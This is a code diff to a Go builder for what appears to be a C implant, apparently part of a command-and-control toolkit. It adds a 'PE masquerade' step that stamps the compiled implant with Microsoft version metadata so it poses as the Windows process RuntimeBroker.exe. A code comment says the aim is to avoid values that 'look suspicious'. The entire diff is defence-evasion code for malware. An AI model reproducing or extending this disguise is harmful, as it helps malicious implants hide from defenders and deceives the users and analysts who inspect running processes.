@@ -38,6 +38,17 @@ type CConfig struct {
 	ExecMethod    string // "cmd" | "powershell"
 	Debug         bool
 
+	// PE masquerade — version resource + post-build patches
+	MasqCompany  string // default: "Microsoft Corporation"
+	MasqProduct  string // default: "Microsoft Windows Operating System"
+	MasqDesc     string // default: "Runtime Broker"
+	MasqInternal string // default: "RuntimeBroker"
+	MasqOrigFile string // default: "RuntimeBroker.exe"
+	MasqVerMajor int    // default: 10
+	MasqVerMinor int    // default: 0
+	MasqVerBuild int    // default: 19041
+	MasqVerRev   int    // default: 1
+
 	OutputDir  string
 	OutputName string
 }
@@ -74,6 +85,33 @@ func BuildC(cfg *CConfig) (*Result, error) {
 	}
 	if cfg.ExecMethod == "" {
 		cfg.ExecMethod = "cmd"
+	}
+
+	// PE masquerade defaults — mimic RuntimeBroker.exe (legitimate Win10+ process)
+	if cfg.MasqCompany == "" {
+		cfg.MasqCompany = "Microsoft Corporation"
+	}
+	if cfg.MasqProduct == "" {
+		cfg.MasqProduct = "Microsoft Windows Operating System"
+	}
+	if cfg.MasqDesc == "" {
+		cfg.MasqDesc = "Runtime Broker"
+	}
+	if cfg.MasqInternal == "" {
+		cfg.MasqInternal = "RuntimeBroker"
+	}
+	if cfg.MasqOrigFile == "" {
+		cfg.MasqOrigFile = "RuntimeBroker.exe"
+	}
+	if cfg.MasqVerMajor == 0 {
+		cfg.MasqVerMajor = 10
+	}
+	// MasqVerBuild 0 is a valid build number, but 0 looks suspicious — default to 19041
+	if cfg.MasqVerBuild == 0 {
+		cfg.MasqVerBuild = 19041
+	}
+	if cfg.MasqVerRev == 0 {
+		cfg.MasqVerRev = 1
 	}
 
 	// Locate implant-c source relative to module root
@@ -137,6 +175,32 @@ func BuildC(cfg *CConfig) (*Result, error) {
 	configPath := filepath.Join(tmpDir, "include", "config.h")
 	if err := os.WriteFile(configPath, []byte(configH), 0644); err != nil {
 		return nil, fmt.Errorf("write config.h: %w", err)
+	}
+
+	// Write generated version.rc from template
+	rcTmplPath := filepath.Join(tmpDir, "resource", "version.rc.tmpl")
+	rcTmplBytes, err := os.ReadFile(rcTmplPath)
+	if err != nil {
+		return nil, fmt.Errorf("read version.rc.tmpl: %w", err)
+	}
+	rcContent := string(rcTmplBytes)
+	rcReplacements := map[string]string{
+		"@@VER_COMPANY@@":  cfg.MasqCompany,
+		"@@VER_PRODUCT@@":  cfg.MasqProduct,
+		"@@VER_DESC@@":     cfg.MasqDesc,
+		"@@VER_INTERNAL@@": cfg.MasqInternal,
+		"@@VER_ORIGFILE@@": cfg.MasqOrigFile,
+		"@@VER_MAJ@@":      fmt.Sprintf("%d", cfg.MasqVerMajor),
+		"@@VER_MIN@@":      fmt.Sprintf("%d", cfg.MasqVerMinor),
+		"@@VER_BUILD@@":    fmt.Sprintf("%d", cfg.MasqVerBuild),
+		"@@VER_REV@@":      fmt.Sprintf("%d", cfg.MasqVerRev),
+	}
+	for k, v := range rcReplacements {
+		rcContent = strings.ReplaceAll(rcContent, k, v)
+	}
+	rcPath := filepath.Join(tmpDir, "resource", "version.rc")
+	if err := os.WriteFile(rcPath, []byte(rcContent), 0644); err != nil {
+		return nil, fmt.Errorf("write version.rc: %w", err)
 	}
 
 	// Determine output path
